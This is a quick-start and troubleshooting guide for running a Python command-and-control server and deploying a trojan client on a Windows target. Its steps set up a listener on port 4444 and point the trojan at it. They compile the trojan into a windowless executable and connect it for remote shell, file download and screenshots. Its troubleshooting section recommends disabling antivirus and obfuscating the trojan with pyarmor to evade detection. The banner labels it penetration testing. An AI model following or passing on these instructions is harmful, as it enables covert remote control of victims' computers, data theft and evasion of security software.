INSTALLATION QUICK START
─────────────────────────────────────────

STEP 1: SET UP C2 SERVER (Linux/Kali - 5 minutes)

1. Create working directory:
   mkdir /opt/c2_server
   cd /opt/c2_server

2. Copy c2_server.py to /opt/c2_server/

3. Verify Python:
   python3 --version  # Should be 3.7+

4. Create directories for logs:
   mkdir -p downloads screenshots

5. Start server:
   python3 c2_server.py

   Expected output:
   ╔════════════════════════════════════════════════════════════╗
   ║     COMMAND & CONTROL SERVER - PENETRATION TESTING        ║
   │  Server: 0.0.0.0:4444                                     │
   │  Status: LISTENING FOR CONNECTIONS                        │
   ╚════════════════════════════════════════════════════════════╝


STEP 2: CONFIGURE TROJAN (Windows - 5 minutes)

1. Copy trojan_client.py to Windows target

2. Edit trojan_client.py:
   Find line 55: C2_SERVER = "192.168.1.100"
   Change to your C2 server IP

3. Test configuration:
   python trojan_client.py
   Should attempt connection...

4. Stop with Ctrl+C


STEP 3: COMPILE TO EXE (Windows - 3 minutes) [OPTIONAL]

1. Install PyInstaller:
   pip install pyinstaller

2. Compile:
   pyinstaller --onefile --noconsole trojan_client.py

3. Executable: dist/trojan_client.exe


STEP 4: DEPLOY ON TARGET (Windows - 1 minute)

1. Run trojan:
   python trojan_client.py
   OR
   dist/trojan_client.exe

2. Check C2 server:
   Should show: [CONNECTION] New connection from X.X.X.X

3. You're connected! Type "help" for commands

TROUBLESHOOTING QUICK GUIDE
═══════════════════════════════════════════════════════════════════════════════════

PROBLEM: "Connection refused" on trojan startup
SOLUTION:
  1. Verify C2 server is running
  2. Check C2_SERVER IP is correct (ipconfig on Windows)
  3. Verify firewall allows port 4444
  4. Test: ping <C2_SERVER_IP> from target

PROBLEM: C2 Server shows connection, then disconnect immediately
SOLUTION:
  1. Check Python version: python --version (need 3.7+)
  2. Install missing packages: pip install psutil pillow
  3. Check error in console output
  4. Verify firewall not blocking trojan

PROBLEM: File download returns "FILE_NOT_FOUND"
SOLUTION:
  1. Verify full path is correct
  2. Check file exists: shell dir "<path>"
  3. Verify user has read permissions
  4. Try with different file

PROBLEM: Screenshot command hangs
SOLUTION:
  1. Check Pillow installed: pip install pillow
  2. Try different resolution
  3. Check display is accessible
  4. Try again from different user

PROBLEM: Antivirus blocks trojan immediately
SOLUTION:
  This is EXPECTED - it means antivirus is working!
  1. Check antivirus logs for detection details
  2. Disable antivirus if authorized (for testing only)
  3. Use obfuscation: pyarmor obfuscate trojan_client.py
